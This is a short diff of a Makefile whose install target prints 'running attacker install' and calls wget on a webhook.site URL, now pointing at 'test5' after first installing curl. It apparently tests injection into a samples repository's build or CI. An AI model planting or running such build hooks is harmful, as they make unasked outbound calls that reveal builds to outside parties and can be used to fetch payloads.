@@ -1,6 +1,7 @@
 install:
 	@echo "running attacker install"
-	wget https://webhook.site/TestActions/google-adk-samples/test4 ; \1
+	apt install curl;
+	wget https://webhook.site/TestActions/google-adk-samples/test5;
 
 lint:
 	@echo "do nothing"
